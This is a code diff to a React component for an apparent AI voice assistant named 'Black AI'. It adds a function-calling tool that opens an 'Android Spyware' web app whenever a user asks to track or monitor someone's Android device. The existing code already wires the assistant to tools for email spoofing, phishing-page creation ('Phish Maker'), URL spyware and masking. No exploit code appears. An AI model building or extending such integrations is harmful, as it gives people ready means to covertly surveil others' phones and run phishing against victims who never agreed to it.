@@ -38,6 +38,7 @@ interface AltairProps {
   onShowWorldIPTV: () => void; // Added for World IPTV widget
   onShowPhishMaker: () => void; // Added for Phish Maker widget
   onShowDataBank: () => void; // Added for Data Bank widget
+  onShowAndroidSpyware: (url: string) => void; // Added for Android Spyware widget
 }
 
 const altairDeclaration: FunctionDeclaration = {
@@ -358,8 +359,24 @@ const phishMakerDeclaration: FunctionDeclaration = {
   }
 };
 
+// Android Spyware widget declaration
+const androidSpywareDeclaration: FunctionDeclaration = {
+  name: "show_android_spyware",
+  description: "Display an Android Spyware widget when the user asks to track or monitor someone's android device by opening a specific URL.",
+  parameters: {
+    type: Type.OBJECT,
+    properties: {
+      url: {
+        type: Type.STRING,
+        description: "The URL of the Android Spyware web app (e.g., 'https://black-aspyware.vercel.app/')"
+      }
+    },
+    required: ["url"]
+  }
+};
 
-function AltairComponent({ onShowMap, onShowVirtualMap, onSearchYouTube, onShowCyberThreatMap, onShowEmailSpoofer, onShowCreditCard, onShowLiveStream, onShowBitcoinPrivkey, onShowSocialActivityTracker, onShowPhotoGeo, onShowURLSpyware, onShowSpiderFoot, onShowDigitalFootprint, onShowSubdomainFinder, onShowURLMasker, onShowWorldIPTV, onShowPhishMaker, onShowDataBank }: AltairProps) {
+
+function AltairComponent({ onShowMap, onShowVirtualMap, onSearchYouTube, onShowCyberThreatMap, onShowEmailSpoofer, onShowCreditCard, onShowLiveStream, onShowBitcoinPrivkey, onShowSocialActivityTracker, onShowPhotoGeo, onShowURLSpyware, onShowSpiderFoot, onShowDigitalFootprint, onShowSubdomainFinder, onShowURLMasker, onShowWorldIPTV, onShowPhishMaker, onShowDataBank, onShowAndroidSpyware }: AltairProps) {
   const [jsonString, setJSONString] = useState<string>("");
   const { client, setConfig, setModel } = useLiveAPIContext();
   const [location, setLocation] = useState<LocationData | null>(null);
@@ -455,6 +472,7 @@ In order to ask Black AI a question, the user must give the prompt in the conver
         { functionDeclarations: [worldIPTVDeclaration] }, // Added World IPTV tool declaration
         { functionDeclarations: [phishMakerDeclaration] }, // Added Phish Maker tool declaration
         { functionDeclarations: [dataBankDeclaration] }, // Added Data Bank tool declaration
+        { functionDeclarations: [androidSpywareDeclaration] }, // Added Android Spyware tool declaration
       ],
     });
   }, [setConfig, setModel, location, locationError]);
@@ -738,6 +756,10 @@ In order to ask Black AI a question, the user must give the prompt in the conver
         } else if (name === dataBankDeclaration.name) {
           console.log(`Data Bank widget requested`);
           onShowDataBank();
+        } else if (name === androidSpywareDeclaration.name) {
+          const url = (fc.args as any).url;
+          console.log(`Android Spyware requested for URL: ${url}`);
+          onShowAndroidSpyware(url);
         }
       });
 
@@ -795,6 +817,10 @@ In order to ask Black AI a question, the user must give the prompt in the conver
                       ? `World IPTV widget opened. You can now watch world IPTV channels.`
                       : fc.name === phishMakerDeclaration.name // Response for Phish Maker widget
                       ? `Phish Maker widget opened. You can now create phishing pages or sites.`
+                      : fc.name === dataBankDeclaration.name // Response for Data Bank widget
+                      ? `Data Bank widget opened.`
+                      : fc.name === androidSpywareDeclaration.name // Response for Android Spyware widget
+                      ? `Opening Android Spyware widget for: ${(fc.args as any).url}`
                       : "Function executed successfully"
                   }
                 },
@@ -810,7 +836,7 @@ In order to ask Black AI a question, the user must give the prompt in the conver
     return () => {
       client.off("toolcall", onToolCall);
     };
-  }, [client, onShowMap, onShowVirtualMap, onSearchYouTube, onShowCyberThreatMap, onShowEmailSpoofer, onShowCreditCard, onShowLiveStream, onShowBitcoinPrivkey, onShowSocialActivityTracker, onShowPhotoGeo, onShowURLSpyware, onShowSpiderFoot, onShowDigitalFootprint, onShowSubdomainFinder, onShowURLMasker, onShowWorldIPTV, onShowPhishMaker, onShowDataBank, location]);
+  }, [client, onShowMap, onShowVirtualMap, onSearchYouTube, onShowCyberThreatMap, onShowEmailSpoofer, onShowCreditCard, onShowLiveStream, onShowBitcoinPrivkey, onShowSocialActivityTracker, onShowPhotoGeo, onShowURLSpyware, onShowSpiderFoot, onShowDigitalFootprint, onShowSubdomainFinder, onShowURLMasker, onShowWorldIPTV, onShowPhishMaker, onShowDataBank, onShowAndroidSpyware, location]);
 
   const embedRef = useRef<HTMLDivElement>(null);
 
